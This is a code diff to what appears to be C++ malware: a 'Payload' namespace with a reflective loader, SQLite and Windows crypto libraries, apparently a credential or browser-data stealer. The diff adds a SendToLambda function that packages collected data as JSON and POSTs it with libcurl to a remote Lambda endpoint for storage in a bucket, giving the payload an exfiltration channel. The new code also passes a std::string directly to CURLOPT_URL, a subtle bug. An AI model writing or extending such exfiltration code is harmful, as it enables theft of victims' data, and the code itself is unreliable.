@@ -24,8 +24,11 @@
 #include <unordered_map>
 #include <set>
 
+#include <sstream>
+
 #include "reflective_loader.h"
 #include "sqlite3.h"
+#include <curl/curl.h>
 
 #pragma comment(lib, "Crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
@@ -150,6 +153,42 @@ namespace Payload
                 }
             }
             return o.str();
+        }
+
+        void SendToLambda(const std::string& lambdaUrl,
+                          const std::string& jsonData,
+                          const std::string& bucket,
+                          const std::string& dir,
+                          const std::string& fileName)
+        {
+            CURL* curl = curl_easy_init();
+            if (!curl) return;
+
+            // Build JSON payload for Lambda
+            std::ostringstream payload;
+            payload << "{"
+                    << "\"bucket\":\"" << bucket << "\","
+                    << "\"dir\":\"" << dir << "\","
+                    << "\"fileName\":\"" << fileName << "\","
+                    << "\"fileBody\":" << jsonData
+                    << "}";
+
+            std::string payloadStr = payload.str();
+
+            struct curl_slist* headers = nullptr;
+            headers = curl_slist_append(headers, "Content-Type: application/json");
+
+            curl_easy_setopt(curl, CURLOPT_URL, lambdaUrl);
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payloadStr.c_str());
+            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+            CURLcode res = curl_easy_perform(curl);
+            if (res != CURLE_OK) {
+                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            }
+
+            curl_slist_free_all(headers);
+            curl_easy_cleanup(curl);
         }
     }
 
@@ -410,6 +449,7 @@ namespace Payload
             m_pipe = CreateFileW(pipeName, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
         }
 
+        // A destructor called when the pipe goes out of scope.
         ~PipeLogger()
         {
             if (m_pipe != INVALID_HANDLE_VALUE)
